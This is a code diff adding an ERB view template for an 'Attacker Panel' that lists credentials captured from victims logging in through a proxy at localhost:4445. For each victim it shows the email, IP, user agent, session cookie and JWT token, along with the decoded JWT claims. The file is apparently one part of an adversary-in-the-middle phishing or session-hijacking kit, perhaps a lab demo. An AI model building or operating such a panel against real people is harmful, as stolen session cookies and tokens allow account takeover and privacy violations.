@@ -1,0 +1,84 @@
+<% @title = "Attacker Panel — Captured Tokens" %>
+
+<div class="attacker-dashboard">
+
+  <div class="attacker-header-info">
+    <h1> Captured Credentials</h1>
+    <p class="subtitle">
+      Total captured: <strong><%= @decoded.length %></strong>
+    </p>
+  </div>
+
+  <% if @decoded.empty? %>
+    <div class="empty-state">
+      <p> No credentials captured yet.</p>
+      <p>Wait for a victim to log in through the proxy at
+        <strong>localhost:4445</strong>
+      </p>
+    </div>
+  <% else %>
+
+    <% @decoded.each do |entry| %>
+      <div class="credential-card">
+
+        <div class="credential-header">
+          <span class="victim-email">👤 <%= entry[:cred][:email] %></span>
+          <span class="captured-time">
+            🕐 <%= entry[:cred][:captured_at] %>
+          </span>
+        </div>
+
+        <div class="credential-body">
+
+          <div class="credential-row">
+            <span class="label">IP</span>
+            <span class="value"><%= entry[:cred][:ip] %></span>
+          </div>
+
+          <div class="credential-row">
+            <span class="label">User Agent</span>
+            <span class="value"><%= entry[:cred][:user_agent] %></span>
+          </div>
+
+          <div class="credential-row">
+            <span class="label">Session Cookie</span>
+            <span class="value cookie"><%= entry[:cred][:session_cookie] %></span>
+          </div>
+
+          <div class="credential-row">
+            <span class="label">JWT Token</span>
+            <span class="value token"><%= entry[:cred][:token] %></span>
+          </div>
+
+          <% if entry[:valid] %>
+            <div class="jwt-payload">
+              <h4> Decoded JWT Payload</h4>
+              <div class="payload-row">
+                <span class="label">Subject (user)</span>
+                <span class="value"><%= entry[:payload]['sub'] %></span>
+              </div>
+              <div class="payload-row">
+                <span class="label">Issuer</span>
+                <span class="value"><%= entry[:payload]['iss'] %></span>
+              </div>
+              <div class="payload-row">
+                <span class="label">Issued at</span>
+                <span class="value">
+                  <%= Time.at(entry[:payload]['iat']).strftime("%Y-%m-%d %H:%M:%S") %>
+                </span>
+              </div>
+              <div class="payload-row">
+                <span class="label">Expires at</span>
+                <span class="value">
+                  <%= Time.at(entry[:payload]['exp']).strftime("%Y-%m-%d %H:%M:%S") %>
+                </span>
+              </div>
+            </div>
+          <% end %>
+
+        </div>
+      </div>
+    <% end %>
+
+  <% end %>
+</div>
